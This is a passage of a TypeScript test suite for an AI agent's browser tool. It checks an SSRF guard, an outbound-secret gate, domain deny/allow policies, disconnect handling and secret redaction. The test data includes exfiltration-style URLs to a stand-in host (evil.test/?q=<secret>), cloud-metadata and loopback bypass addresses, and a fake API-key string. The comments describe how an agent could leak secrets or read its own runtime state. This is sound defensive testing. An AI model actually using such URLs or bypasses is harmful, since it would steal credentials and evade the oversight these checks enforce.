import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, mock, test } from "bun:test";
import { existsSync, mkdirSync, readdirSync, rmSync, symlinkSync, utimesSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import {
  __test as browserTest,
  browserClick,
  browserConsole,
  browserCookies,
  browserDialog,
  browserDownloadApproved,
  browserDrag,
  browserFillByLocator,
  browserFillForm,
  browserHover,
  browserNavigate,
  browserRequests,
  browserResize,
  browserSelectOption,
  browserSnapshot,
  browserTabs,
  browserUploadFile,
  browserUploadFileApproved,
  browserVision,
  browserWaitFor,
  chromeProfileDirFor,
  closeAll,
  currentDisconnectGeneration,
  getScreencastPort,
  disconnectSharedBrowser,
  domainPolicyBlockReason,
  hostnameIsLoopback,
  peekCurrentBrowserTargetId,
  peekCurrentBrowserUrl,
  redactSecretValuesFromString,
  safetyCheck,
  sanitizeDownloadFilename,
  setBrowserInstance,
  setBrowserRecording
} from "./browser";
import { dispatchToolCall } from "../execution/tool-dispatch";
import { resolveSetupRequest } from "../agent";
import { completeBrowserConnectSetup } from "../capabilities/browser-connect";
import { resolveImageByteLimit } from "../provider-capabilities";
import {
  clearEchoAuxTextResponses,
  clearEchoVisionResponses,
  getEchoAuxTextRequests,
  setEchoAuxTextFailure,
  setEchoAuxTextResponse,
  setEchoVisionResponse
} from "../provider";
import { createAgentRecord, createChatSession, createTask, mutateState, readState, readTrace, upsertTask } from "../state";
import type { RuntimeConfig } from "../types";

// Direct unit coverage for the URL safety guard. We exercise the function
// without spinning up Chromium since the guard runs synchronously on the
// raw URL string before any browser work begins.
describe("browser safetyCheck", () => {
  test("blocks IPv4-mapped IPv6 dotted-quad form pointing at metadata", () => {
    const result = safetyCheck("http://[::ffff:169.254.169.254]/");
    expect(result).toBeDefined();
    expect(result!.startsWith("Blocked:")).toBe(true);
  });

  test("blocks IPv4-mapped IPv6 canonical hex form pointing at metadata", () => {
    // Bun normalizes [::ffff:169.254.169.254] to [::ffff:a9fe:a9fe], so the
    // hex-form decoder is what actually catches the request in practice.
    const result = safetyCheck("http://[::ffff:a9fe:a9fe]/");
    expect(result).toBeDefined();
    expect(result!.startsWith("Blocked:")).toBe(true);
  });

  test("blocks fe80:: link-local IPv6", () => {
    const result = safetyCheck("http://[fe80::1]/");
    expect(result).toBeDefined();
    expect(result!.startsWith("Blocked:")).toBe(true);
  });

  test("does not false-positive on fe8:: (outside fe80::/10 range)", () => {
    // fe8::1 zero-expands to 0fe8:: which is not in the link-local range.
    // The previous regex `^fe[89ab][0-9a-f]?:` would over-match; the fix
    // requires the fourth hex digit so this no longer triggers.
    const result = safetyCheck("http://[fe8::1]/");
    expect(result).toBeUndefined();
  });

  test("does not leak secret-bearing input through Invalid URL error", () => {
    // Malformed URL that nonetheless contains an apparent token. The
    // pre-parse secret scan should catch it and return a generic
    // "Blocked:" message that does NOT echo the raw input.
    const sneaky = "not-a-url sk-ant-api03-DEADBEEFDEADBEEFDEADBEEFDEADBEEF";
    const result = safetyCheck(sneaky);
    expect(result).toBeDefined();
    expect(result!.startsWith("Blocked:")).toBe(true);
    expect(result).not.toContain("sk-ant-");
    expect(result).not.toContain(sneaky);
  });

  test("catches percent-encoded tokens hidden alongside malformed escapes", () => {
    // %zz is a malformed escape that would make all-or-nothing
    // decodeURIComponent throw, falling back to scanning only the raw form.
    // The percent-decoded `%73%6b-ant-api03-...` segment is `sk-ant-api03-...`
    // which should be detected by the permissive per-`%HH` decoder.
    const sneaky = "http://example.com/%zz/%73%6b-ant-api03-XXXXXXXXXXXXXXXXXXXXXXXXXXXX";
    const result = safetyCheck(sneaky);
    expect(result).toBeDefined();
    expect(result!.startsWith("Blocked:")).toBe(true);
    expect(result).not.toContain(sneaky);
    expect(result).not.toContain("sk-ant-");
    expect(result).not.toContain("%73%6b");
  });

  test("allows ordinary https URLs", () => {
    expect(safetyCheck("https://example.com/")).toBeUndefined();
  });

  test("trailing-dot bypass: localhost. / 127.0.0.1. are still loopback", () => {
    // DNS roots can be written with a trailing "." and resolvers
    // treat them as equivalent to the dotless form. Without the
    // strip, endsWith(".localhost") would miss "localhost.", and the
    // BLOCKED_HOSTNAMES literal check would miss "127.0.0.1.".
    for (const url of ["http://localhost./api", "http://127.0.0.1./api"]) {
      const result = safetyCheck(url);
      expect(result).toBeDefined();
      expect(result).toContain("loopback");
    }
  });

  test("IPv4-compat IPv6 hex loopback bypass: [::7f00:1] decodes to 127.0.0.1", () => {
    // Bun's URL parser normalizes [::127.0.0.1] to [::7f00:1] (hex
    // IPv4-compat), so the literal-match path never sees the dotted
    // form. The hex decoder must recognize it.
    const result = safetyCheck("http://[::7f00:1]/");
    expect(result).toBeDefined();
    expect(result).toContain("loopback");
  });

  test("IPv4-mapped IPv6 loopback forms are decoded and blocked", () => {
    // Bun normalizes various IPv6 spellings; the decoder translates the
    // mapped IPv6 to its IPv4 form BEFORE the loopback check, so a mapped
    // loopback ([::ffff:127.0.0.1] dot-quad, [::ffff:7f00:1] hex) is refused
    // with the correct loopback message rather than slipping through the
    // metadata path.
    const blocked = safetyCheck("http://[::ffff:127.0.0.1]/");
    expect(blocked).toBeDefined();
    expect(blocked).toContain("loopback");
    const blocked2 = safetyCheck("http://[::ffff:7f00:1]/");
    expect(blocked2).toBeDefined();
    expect(blocked2).toContain("loopback");
  });

  test("allowLoopback opts out of the loopback block for CDP-attach callers", () => {
    // The cdp-attach path validates a user-supplied CDP endpoint, which is
    // always loopback by design (127.0.0.1:9222 / localhost). allowLoopback
    // lets that legitimate attach through while agent navigation (no opt-out)
    // still refuses loopback, and the OTHER blocks (metadata, link-local) still
    // fire even under the opt-out.
    expect(safetyCheck("http://127.0.0.1:9222/", { allowLoopback: true })).toBeUndefined();
    expect(safetyCheck("http://localhost:9222/", { allowLoopback: true })).toBeUndefined();
    expect(safetyCheck("http://[::1]:9222/", { allowLoopback: true })).toBeUndefined();
    // Metadata IP is NOT loopback — still blocked even with the opt-out.
    expect(safetyCheck("http://169.254.169.254/", { allowLoopback: true })).toBeDefined();
  });

  test("IPv4-mapped IPv6 loopback respects allowLoopback (CDP attach)", () => {
    // The mapped IPv6 loopback forms go through the same allowLoopback opt-out
    // as the bare IPv4 form once decoded.
    expect(safetyCheck("http://[::ffff:127.0.0.1]:9222/", { allowLoopback: true })).toBeUndefined();
    expect(safetyCheck("http://[::ffff:7f00:1]:9222/", { allowLoopback: true })).toBeUndefined();
  });

  test("blocks loopback navigation (BFF / runtime SSRF surface)", () => {
    // The BFF's catch-all /api/runtime/* proxy injects the runtime
    // bearer for safe-method loopback requests, so an agent that
    // navigates the controlled browser to its own host can read
    // runtime state (including messaging.approve_pairing payloads).
    // Pin that the loopback variants are all refused — IPv4 literal,
    // IPv6 literal, 0.0.0.0, the localhost hostname, and the 127/8
    // range and *.localhost.
    const refused = [
      "http://127.0.0.1:3082/api/runtime/approvals",
      "http://localhost:3082/api/state",
      "http://0.0.0.0/",
      "http://[::1]/",
      "http://127.5.5.5/",
      "http://example.localhost/"
    ];
    for (const url of refused) {
      const result = safetyCheck(url);
      expect(result).toBeDefined();
      expect(result!.startsWith("Blocked:")).toBe(true);
      expect(result).toContain("loopback");
    }
  });
});

// Outbound exfiltration gate: redaction scrubs registered secrets from
// everything the model READS, but the model can still compose a navigation
// URL that carries a filled value OUT to an attacker host
// (https://evil.test/?q=<secret>). safetyCheck refuses such URLs — raw or
// percent-encoded — with a generic message that never echoes the value.
describe("browser safetyCheck registered-secret URL gate", () => {
  const taskId = "task-secret-url-gate";
  const secret = "hunter2-correct-horse";

  afterEach(() => {
    browserTest.resetFilledSecretsForTest();
  });

  test("blocks a URL embedding a registered secret verbatim", () => {
    browserTest.recordFilledSecretForTest(taskId, secret);
    const result = safetyCheck(`https://evil.test/?q=${secret}`);
    expect(result).toBeDefined();
    expect(result!.startsWith("Blocked:")).toBe(true);
    expect(result).not.toContain(secret);
  });

  test("blocks the percent-encoded form of a registered secret", () => {
    browserTest.recordFilledSecretForTest(taskId, secret);
    const encoded = secret
      .split("")
      .map((c) => `%${c.charCodeAt(0).toString(16).padStart(2, "0")}`)
      .join("");
    const result = safetyCheck(`https://evil.test/?q=${encoded}`);
    expect(result).toBeDefined();
    expect(result!.startsWith("Blocked:")).toBe(true);
    // Generic message: neither the raw value nor its encoded form leaks
    // into the trace/audit row.
    expect(result).not.toContain(secret);
    expect(result).not.toContain(encoded);
  });

  test("secrets registered by another task still block (cross-task union)", () => {
    // safetyCheck reads the union across every active task's registry —
    // the shared-BrowserContext architecture means a secret typed by one
    // task can surface in another task's composed URL.
    browserTest.recordFilledSecretForTest("some-other-task", secret);
    expect(safetyCheck(`https://evil.test/?q=${secret}`)).toBeDefined();
  });

  test("values below the redaction floor do not block", () => {
    // Mirrors recordFilledSecret's floor: a tiny value substring-matches
    // structural URL bytes and would false-positive on ordinary URLs.
    browserTest.recordFilledSecretForTest(taskId, "abc");
    expect(safetyCheck("https://example.com/?q=abc")).toBeUndefined();
  });

  test("unrelated URLs still pass while secrets are registered", () => {
    browserTest.recordFilledSecretForTest(taskId, secret);
    expect(safetyCheck("https://example.com/")).toBeUndefined();
  });

  test("browser_navigate fails closed pre-flight without echoing the value", async () => {
    browserTest.recordFilledSecretForTest(taskId, secret);
    const raw = await browserNavigate(taskId, { url: `https://evil.test/?q=${secret}` });
    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
    expect(parsed.success).toBe(false);
    expect(raw).not.toContain(secret);
  });
});

// Matching semantics for the per-agent browsing boundary. Pure-function
// coverage; enforcement plumbing is covered in the describe below. See
// ADR browser-domain-policy.md.
describe("browser domainPolicyBlockReason", () => {
  test("no policy or empty lists allow everything", () => {
    expect(domainPolicyBlockReason("https://example.com/", undefined)).toBeUndefined();
    expect(domainPolicyBlockReason("https://example.com/", {})).toBeUndefined();
    expect(domainPolicyBlockReason("https://example.com/", { deny: [], allow: [] })).toBeUndefined();
  });

  test("deny matches the exact host and subdomains, case-insensitively", () => {
    const policy = { deny: ["Tracker.Evil"] };
    for (const url of [
      "https://tracker.evil/",
      "https://TRACKER.EVIL/path",
      "https://sub.tracker.evil/",
      "https://deep.sub.tracker.evil/"
    ]) {
      const result = domainPolicyBlockReason(url, policy);
      expect(result).toBeDefined();
      expect(result).toContain("domain policy");
    }
  });

  test("deny is suffix-on-domain-boundary, not substring", () => {
    const policy = { deny: ["example.com"] };
    // notexample.com merely ends with the same bytes — no dot boundary.
    expect(domainPolicyBlockReason("https://notexample.com/", policy)).toBeUndefined();
    expect(domainPolicyBlockReason("https://example.com.attacker.net/", policy)).toBeUndefined();
  });

  test("non-empty allow switches to allow-only mode", () => {
    const policy = { allow: ["example.com"] };
    expect(domainPolicyBlockReason("https://example.com/", policy)).toBeUndefined();
    expect(domainPolicyBlockReason("https://docs.example.com/", policy)).toBeUndefined();
    const blocked = domainPolicyBlockReason("https://other.test/", policy);
    expect(blocked).toBeDefined();
    expect(blocked).toContain("other.test");
    expect(blocked).toContain("allow-only");
  });

  test("deny beats allow when a host matches both lists", () => {
    const policy = { deny: ["bad.example.com"], allow: ["example.com"] };
    expect(domainPolicyBlockReason("https://example.com/", policy)).toBeUndefined();
    const blocked = domainPolicyBlockReason("https://bad.example.com/", policy);
    expect(blocked).toBeDefined();
    expect(blocked).toContain("denied");
  });

  test("unparseable URLs pass through (safetyCheck owns that refusal)", () => {
    expect(domainPolicyBlockReason("not a url", { deny: ["example.com"] })).toBeUndefined();
  });
});

// Enforcement plumbing: the policy is read from the task's owning agent's
// AgentRecord.browserDomainPolicy in state, checked at navigate pre-flight
// and at the live-page origin boundary (post-redirect re-validation).
describe("browser domain policy enforcement", () => {
  const ROOT = "/tmp/gini-browser-domain-policy-tests";
  const instance = `browser-domain-policy-${process.pid}`;

  // Seed an agent carrying the policy and a task owned by it, register the
  // instance with the browser layer, and hand back the task id.
  async function seedPolicyTask(policy: { deny?: string[]; allow?: string[] }): Promise<string> {
    process.env["GINI_STATE_ROOT"] = ROOT;
    rmSync(`${ROOT}/instances/${instance}`, { recursive: true, force: true });
    setBrowserInstance(instance);
    return mutateState(instance, (state) => {
      const agent = createAgentRecord(state, {
        name: "policy-agent",
        toolsets: [],
        messagingTargets: [],
        browserDomainPolicy: policy
      });
      const task = createTask(state.instance, "domain policy test", undefined, undefined, undefined, undefined, agent.id);
      upsertTask(state, task);
      return task.id;
    });
  }

  // seedPolicyTask repoints GINI_STATE_ROOT for the duration of this
  // describe; capture the incoming value at test time (other describes set
  // it during collection) and restore it so later tests in this file read
  // their own roots.
  let priorStateRoot: string | undefined;
  beforeAll(() => {
    priorStateRoot = process.env["GINI_STATE_ROOT"];
  });

  afterEach(() => {
    setBrowserInstance("default");
  });

  afterAll(() => {
    if (priorStateRoot === undefined) delete process.env["GINI_STATE_ROOT"];
    else process.env["GINI_STATE_ROOT"] = priorStateRoot;
    rmSync(ROOT, { recursive: true, force: true });
  });

  test("browser_navigate fails pre-flight on a denied domain, naming it", async () => {
    const taskId = await seedPolicyTask({ deny: ["tracker.evil"] });
    const raw = await browserNavigate(taskId, { url: "https://sub.tracker.evil/pixel" });
    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
    expect(parsed.success).toBe(false);
    expect(parsed.error).toContain("sub.tracker.evil");
    expect(parsed.error).toContain("domain policy");
  });

  test("allow cannot override the SSRF gate (loopback stays blocked)", async () => {
    const taskId = await seedPolicyTask({ allow: ["localhost"] });
    const raw = await browserNavigate(taskId, { url: "http://localhost:3082/api/state" });
    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
    expect(parsed.success).toBe(false);
    expect(parsed.error).toContain("loopback");
  });

  test("post-redirect re-validation bounces a page parked on a denied domain", async () => {
    const taskId = await seedPolicyTask({ deny: ["tracker.evil"] });
    const gotos: string[] = [];
    const fakePage = {
      url: () => "https://tracker.evil/landing",
      goto: async (url: string) => {
        gotos.push(url);
        return null;
      }
    } as unknown as Parameters<typeof browserTest.disallowedOriginReasonForTest>[0];
    const reason = await browserTest.disallowedOriginReasonForTest(fakePage, taskId);
    expect(reason).toBeDefined();
    expect(reason).toContain("tracker.evil");
    expect(reason).toContain("domain policy");
    expect(gotos).toEqual(["about:blank"]);
  });

  test("a page on a non-denied domain passes the origin boundary", async () => {
    const taskId = await seedPolicyTask({ deny: ["tracker.evil"] });
    const fakePage = {
      url: () => "https://example.com/",
      goto: async () => null
    } as unknown as Parameters<typeof browserTest.disallowedOriginReasonForTest>[0];
    expect(await browserTest.disallowedOriginReasonForTest(fakePage, taskId)).toBeUndefined();
  });

  test("tasks with no owning agent have no domain policy", async () => {
    await seedPolicyTask({ deny: ["tracker.evil"] });
    // A second task in the same state with NO agentId: the deny list above
    // belongs to a different agent and must not bleed onto it.
    const orphanTaskId = await mutateState(instance, (state) => {
      const task = createTask(state.instance, "no agent", undefined, undefined, undefined, undefined);
      upsertTask(state, task);
      return task.id;
    });
    setBrowserInstance(instance);
    const fakePage = {
      url: () => "https://tracker.evil/landing",
      goto: async () => null
    } as unknown as Parameters<typeof browserTest.disallowedOriginReasonForTest>[0];
    expect(await browserTest.disallowedOriginReasonForTest(fakePage, orphanTaskId)).toBeUndefined();
  });
});

// Smoke test for the spawned-launch wiring. We can't actually exercise
// playwright-core's launch without spawning Chromium — the real verification
// happens in the manual end-to-end run. What we CAN verify here is that the
// session manager resolves the per-instance profile dir through the instance
// registered via setBrowserInstance(), so the spawned launch targets the right
// instance's chrome-profile dir.
describe("browser session manager state lookup", () => {
  const TEST_ROOT = "/tmp/gini-browser-state-tests";
  process.env["GINI_STATE_ROOT"] = TEST_ROOT;
  const instance = `browser-state-${process.pid}`;

  afterAll(() => {
    // Reset the module-level instance pointer so subsequent test files
    // in the same run don't accidentally read this test instance's state.
    // Passing "default" matches the production end-user instance.
    setBrowserInstance("default");
    rmSync(TEST_ROOT, { recursive: true, force: true });
  });

  test("setBrowserInstance points the spawned profile dir at the right instance", () => {
    rmSync(`${TEST_ROOT}/instances/${instance}`, { recursive: true, force: true });
    setBrowserInstance(instance);
    const dir = browserTest.spawnedProfileDirForTest();
    expect(dir).toContain(instance);
    expect(dir.endsWith("chrome-profile")).toBe(true);
  });

  test("spawnedProfileDir refuses to resolve when no instance is registered", () => {
    browserTest.resetBrowserInstanceForTest();
    expect(() => browserTest.spawnedProfileDirForTest()).toThrow(/No instance registered/);
    // Restore for sibling tests in the same file.
    setBrowserInstance("default");
  });
});

// Spawned transport (the default): disconnect closes the spawned persistent
// BrowserContext, which terminates the Chrome Playwright launched; the profile
// dir stays put so sign-ins persist for the next-call relaunch. (The cdp
// transport's disconnect is covered in the cdp-provider tests.)
describe("browser disconnect lifecycle", () => {
  afterEach(() => {
    // Clean up any synthetic state the previous test installed so
    // subsequent tests start from zero.
    browserTest.uninstallFakeBrowserForTest();
    browserTest.clearFakeSessionsForTest();
    browserTest.setInFlightDisconnectsForTest(0);
    browserTest.clearPendingSharedForTest();
    browserTest.resetTeardownCloseTimeoutForTest();
    browserTest.resetChromeKillerForTest();
    browserTest.resetBrowserInstanceForTest();
  });

  test("in-flight disconnect rejects new browser_navigate admissions", async () => {
    browserTest.setInFlightDisconnectsForTest(1);
    const result = await browserNavigate("disconnect-test-task", { url: "https://example.com/" });
    const parsed = JSON.parse(result) as { success: boolean; error?: string };
    expect(parsed.success).toBe(false);
    expect(parsed.error).toMatch(/disconnecting/i);
  });

  test("disconnectSharedBrowser closes the spawned persistent context (terminating Chromium)", async () => {
    // Closing the BrowserContext is how we shut down the Chromium process
    // Playwright launched. The next browser_* call relaunches the same profile
    // dir, so sign-ins persist.
    let contextCloseCalled = false;
    browserTest.installFakeSpawnedHandleForTest(9401, {
      close: async () => {
        contextCloseCalled = true;
      }
    });
    await disconnectSharedBrowser();
    expect(contextCloseCalled).toBe(true);
  });

  test("closeAll closes the spawned persistent context", async () => {
    let contextCloseCalled = false;
    browserTest.installFakeSpawnedHandleForTest(9402, {
      close: async () => {
        contextCloseCalled = true;
      }
    });
    await closeAll();
    expect(contextCloseCalled).toBe(true);
  });

  test("disconnectSharedBrowser drains in-flight before tearing down", async () => {
    let closeCalled = false;
    browserTest.installFakeSpawnedHandleForTest(9403, {
      close: async () => {
        closeCalled = true;
      }
    });
    // Install a synthetic session reporting an in-flight call.
    browserTest.installFakeSessionForTest("drain-task", 1);
    // Schedule the in-flight to drop to zero after a short delay, well
    // under the 5s deadline. disconnect should observe the drop and
    // proceed.
    setTimeout(() => {
      browserTest.setFakeSessionInFlight("drain-task", 0);
    }, 150);
    const started = Date.now();
    await disconnectSharedBrowser();
    const elapsed = Date.now() - started;
    expect(closeCalled).toBe(true);
    // The wait loop sleeps in 50ms increments, so we should have slept
    // at least ~100ms but well under the 5s deadline.
    expect(elapsed).toBeGreaterThanOrEqual(100);
    expect(elapsed).toBeLessThan(2_000);
  });

  test("disconnectSharedBrowser bounds a wedged context.close() and force-kills the child", async () => {
    // Reproduces the connect/disconnect hang: a Chromium wedged on a heavy
    // navigation never resolves context.close(). Teardown must give up at
    // the bounded budget and reap the child by the handle's profile-dir pid so
    // the lock frees for the relaunch — instead of hanging for minutes.
    setBrowserInstance("teardown-test-instance");
    browserTest.setTeardownCloseTimeoutForTest(50);
    let killerCalled = false;
    let killerDir: string | undefined;
    browserTest.setChromeKillerForTest((dir) => {
      killerCalled = true;
      killerDir = dir;
      return 1;
    });
    const profileDir = chromeProfileDirFor("teardown-test-instance");
    browserTest.installFakeSpawnedHandleForTest(
      9404,
      { close: () => new Promise(() => {}) },
      profileDir
    );
    const started = Date.now();
    await disconnectSharedBrowser();
    const elapsed = Date.now() - started;
    expect(killerCalled).toBe(true);
    expect(killerDir).toBe(profileDir);
    expect(elapsed).toBeLessThan(7_000);
  });

  test("disconnectSharedBrowser is not wedged by a per-page close() that never resolves", async () => {
    // A wedged owned-page close() runs BEFORE teardownHandle; bounding it
    // is what lets disconnect reach the context teardown at all.
    browserTest.setTeardownCloseTimeoutForTest(50);
    let contextCloseCalled = false;
    browserTest.installFakeSpawnedHandleForTest(9405, {
      close: async () => {
        contextCloseCalled = true;
      }
    });
    browserTest.installFakeSessionForTest("wedged-page-task", 0);
    const session = browserTest.getFakeSessionForTest("wedged-page-task");
    expect(session).toBeDefined();
    session!.ownedPageIds.clear();
    session!.ownedPageIds.add({ close: () => new Promise(() => {}) } as never);
    const started = Date.now();
    await disconnectSharedBrowser();
    const elapsed = Date.now() - started;
    expect(contextCloseCalled).toBe(true);
    expect(elapsed).toBeLessThan(7_000);
  });

  // Round-3 review fix: epoch counter. withSession captures the current
  // disconnect generation before awaiting getOrCreate; after the await
  // resumes it compares the current generation to the captured one and
  // bails out cleanly if a disconnect ran (or completed) in the gap.
  // This is deterministic — we control the pendingBrowser promise so
  // getOrCreate's await suspends until we resolve it AFTER bumping the
  // generation.
  test("withSession bails when disconnect generation advances during admission", async () => {
    // Install a pending shared launch that we control so the default tool
    // path's ensureShared await suspends at our latch instead of hitting the
    // real spawn (which would fail with "Chrome not found" and obscure the
    // assertion). The fake spawned handle is what getOrCreate would see after
    // the await resolves — but the test bumps the generation BEFORE we
    // resolve, so the post-await re-check bails before getOrCreate touches it.
    let resolveShared: (handle: unknown) => void = () => undefined;
    const fakeContext = {
      pages: () => [],
      newPage: async () => ({
        on: () => undefined,
        close: () => Promise.resolve(),
        goto: () => Promise.resolve(null),
        url: () => "about:blank",
        title: () => Promise.resolve(""),
        evaluate: () => Promise.resolve([])
      }),
      close: () => Promise.resolve()
    };
    const fakeHandle = {
      kind: "spawned" as const,
      context: fakeContext,
      port: 9333,
      profileDir: "/tmp/fake-profile"
    };
    const pending = new Promise<unknown>((resolve) => {
      resolveShared = resolve;
    });
    browserTest.installPendingSharedForTest(pending as Promise<never>);

    // Kick off the navigation. withSession captures the generation,
    // bumps pendingAdmissions, awaits getOrCreate -> ensureShared ->
    // pendingShared, and suspends.
    const navigatePromise = browserNavigate("admission-race", { url: "https://example.com/" });

    // Yield a microtask so withSession has actually entered the await
    // chain before we bump the generation.
    await new Promise((resolve) => setImmediate(resolve));

    // Simulate a disconnect completing while our admission was
    // suspended. Bump the generation; this is exactly what the real
    // disconnectSharedBrowser does at its top.
    browserTest.bumpDisconnectGenerationForTest();

    // Now resolve the pendingShared so the suspended admission resumes
    // and runs the post-await re-check. It should observe the
    // generation mismatch and bail.
    resolveShared(fakeHandle);

    const result = await navigatePromise;
    const parsed = JSON.parse(result) as { success: boolean; error?: string };
    expect(parsed.success).toBe(false);
    expect(parsed.error).toMatch(/disconnecting/i);
  });
});

// Walker behavior: <select> options should land in the snapshot as sibling
// rows immediately after the select itself, each with its own @eN ref and a
// value="..." annotation. We sidestep Chromium by mocking the page.evaluate
// surface — it just runs the walker's function literal locally against a
// hand-built fake document. The walker only relies on a small slice of DOM
// APIs (tagName, attributes, children, computed style, bounding rect), so
// the stubs stay compact.
describe("browserFillByLocator error redaction", () => {
  // Pin the playwright-error-leaks-typed-value gap. Playwright's
  // locator.fill embeds the typed value in its timeout error
  // message via "Call log: fill(\"<value>\")". If that error.message
  // returned verbatim from browserFillByLocator's catch, the
  // bounded module would persist it to the unredacted trace JSONL
  // (errors[] in appendTrace data) and pass it to the agent via
  // resumeChatTask. The catch must run error.message through
  // redactSecretValuesFromString against the per-task registry.
  test("redacts known secrets out of a playwright-style error message", () => {
    // Simulate playwright's actual error shape:
    // Timeout 10000ms exceeded.
    // Call log:
    //   fill("<value>")
    //   waiting for element to be visible, enabled and editable
    const errorWithValue = 'Timeout 10000ms exceeded.\nCall log:\n  fill("hunter2-LEAK-MARKER")\n  waiting for element to be visible, enabled and editable';
    const redacted = redactSecretValuesFromString(errorWithValue, ["hunter2-LEAK-MARKER"]);
    expect(redacted).not.toContain("hunter2-LEAK-MARKER");
    expect(redacted).toContain("[redacted]");
    // Surrounding diagnostic context survives so the agent still
    // sees the failure reason.
    expect(redacted).toContain("Timeout 10000ms exceeded");
    expect(redacted).toContain("waiting for element");
  });
});

describe("redactSecretValuesDeep object-key redaction", () => {
  // An agent can use a computed object key to smuggle the secret
  // out via JSON serialization: `{[input.value]: 1}` produces
  // `{"hunter2": 1}` and `JSON.stringify` writes the key verbatim.
  // The walker must redact both keys and values.
  const { redactSecretValuesDeep } = require("./browser") as typeof import("./browser");

  test("redacts secret bytes when they appear as object keys", () => {
    const result = redactSecretValuesDeep({ "hunter2-LEAK": 1, other: "ok" }, ["hunter2-LEAK"]) as Record<string, unknown>;
    expect(Object.keys(result)).not.toContain("hunter2-LEAK");
    expect(Object.keys(result)).toContain("[redacted]");
    expect(result.other).toBe("ok");
  });

  test("disambiguates collisions when multiple keys redact to the same token", () => {
    const result = redactSecretValuesDeep({
      "alpha-secret": "a",
      "beta-secret": "b",
      kept: "c"
    }, ["alpha-secret", "beta-secret"]) as Record<string, unknown>;
    // Both secret-keyed entries survive without overwriting each other.
    const keys = Object.keys(result).filter((k) => k !== "kept");
    expect(keys.length).toBe(2);
    expect(keys.every((k) => k.startsWith("[redacted]"))).toBe(true);
    expect(result.kept).toBe("c");
  });
});

describe("redactSecretValuesFromString", () => {
  test("replaces every occurrence of every secret with [redacted]", () => {
    const text = "Login attempt with username=tomsmith and password=SuperSecret123. Retried with SuperSecret123 again.";
    const result = redactSecretValuesFromString(text, ["tomsmith", "SuperSecret123"]);
    expect(result).toBe("Login attempt with username=[redacted] and password=[redacted]. Retried with [redacted] again.");
  });

  test("longer secrets are replaced before shorter prefixes (no partial leakage)", () => {
    // If the shorter secret were replaced first, "abc" → "[redacted]"
    // would leave "def" exposed when the agent had typed "abcdef".
    const text = "input was abcdef and another abcdef";
    const result = redactSecretValuesFromString(text, ["abc", "abcdef"]);
    expect(result).toBe("input was [redacted] and another [redacted]");
  });

  test("no-op on empty inputs", () => {
    expect(redactSecretValuesFromString("", ["abc"])).toBe("");
    expect(redactSecretValuesFromString("text", [])).toBe("text");
    expect(redactSecretValuesFromString("text", ["", ""])).toBe("text");
  });

  test("treats secret as literal string, not regex (metacharacters do not break)", () => {
    const text = "user[1]=root password=.*";
    const result = redactSecretValuesFromString(text, ["root", ".*"]);
    expect(result).toBe("user[1]=[redacted] password=[redacted]");
  });
});

describe("snapshot walker — <select> option surfacing", () => {
  test("emits <option> children as @eN-refed siblings after the select", async () => {
    type FakeEl = {
      tagName: string;
      type?: string;
      value?: string;
      disabled?: boolean;
      hidden?: boolean;
      label?: string;
      text?: string;
      _attrs: Record<string, string>;
      _children: FakeEl[];
      _textContent: string;
      getAttribute(name: string): string | null;
      setAttribute(name: string, value: string): void;
      removeAttribute(name: string): void;
      getBoundingClientRect(): { width: number; height: number };
      get children(): FakeEl[];
      get textContent(): string;
      querySelectorAll(selector: string): FakeEl[];
    };
    const makeEl = (init: Partial<FakeEl> & { tagName: string; visible?: boolean; children?: FakeEl[]; textContent?: string }): FakeEl => {
      const visible = init.visible ?? true;
      const children = init.children ?? [];
      const el: FakeEl = {
        tagName: init.tagName,
        type: init.type,
        value: init.value,
        disabled: init.disabled,
        hidden: init.hidden,
        label: init.label,
        text: init.text,
        _attrs: { ...(init as { _attrs?: Record<string, string> })._attrs },
        _children: children,
        _textContent: init.textContent ?? "",
        getAttribute(name: string) {
          return Object.prototype.hasOwnProperty.call(this._attrs, name) ? this._attrs[name]! : null;
        },
        setAttribute(name: string, value: string) {
          this._attrs[name] = value;
        },
        removeAttribute(name: string) {
          delete this._attrs[name];
        },
        getBoundingClientRect() {
          return visible ? { width: 100, height: 20 } : { width: 0, height: 0 };
        },
        get children() {
          return this._children;
        },
        get textContent() {
          return this._textContent;
        },
        querySelectorAll(selector: string) {
          // Only used by the walker for `option` (and the cleanup
          // `[data-gini-ref]` selector at the top of snapshot()).
          const matches: FakeEl[] = [];
          const recurse = (node: FakeEl) => {
            if (selector === "option") {
              if (node.tagName === "OPTION") matches.push(node);
            } else if (selector.startsWith("[") && selector.endsWith("]")) {
              const attr = selector.slice(1, -1);
              if (Object.prototype.hasOwnProperty.call(node._attrs, attr)) matches.push(node);
            }
            for (const child of node._children) recurse(child);
          };
          for (const child of this._children) recurse(child);
          return matches;
        }
      };
      return el;
    };

    // <body>
    //   <select name="size">
    //     <option value="s">Small</option>
    //     <option value="m">Medium</option>
    //     <option value="l" disabled>Large</option>
    //   </select>
    // </body>
    const optS = makeEl({ tagName: "OPTION", value: "s", text: "Small", label: "Small", textContent: "Small" });
    const optM = makeEl({ tagName: "OPTION", value: "m", text: "Medium", label: "Medium", textContent: "Medium" });
    const optL = makeEl({ tagName: "OPTION", value: "l", text: "Large", label: "Large", disabled: true, textContent: "Large" });
    const select = makeEl({
      tagName: "SELECT",
      value: "s",
      children: [optS, optM, optL],
      textContent: "Small Medium Large"
    });
    const body = makeEl({ tagName: "BODY", children: [select] });

    const docQueryAll = (selector: string): FakeEl[] => body.querySelectorAll(selector);
    const originalDocument = (globalThis as Record<string, unknown>).document;
    const originalWindow = (globalThis as Record<string, unknown>).window;
    const originalCSS = (globalThis as Record<string, unknown>).CSS;
    (globalThis as unknown as { document: unknown }).document = {
      body,
      querySelectorAll: docQueryAll,
      querySelector: (_sel: string) => null,
      getElementById: (_id: string) => null
    };
    (globalThis as unknown as { window: unknown }).window = {
      getComputedStyle: (_el: unknown) => ({ display: "block", visibility: "visible" })
    };
    (globalThis as unknown as { CSS: unknown }).CSS = { escape: (s: string) => s };

    // Fake Page whose page.evaluate(fn, arg) simply runs fn(arg) locally.
    let pageCallCount = 0;
    const fakePage = {
      evaluate: <A, R>(fn: (arg: A) => R | Promise<R>, arg?: A): Promise<R> => {
        pageCallCount++;
        return Promise.resolve(fn(arg as A));
      },
      locator: (_sel: string) => ({} as unknown)
    } as unknown as import("playwright-core").Page;

    try {
      const result = await browserTest.snapshotForTest(fakePage, false);
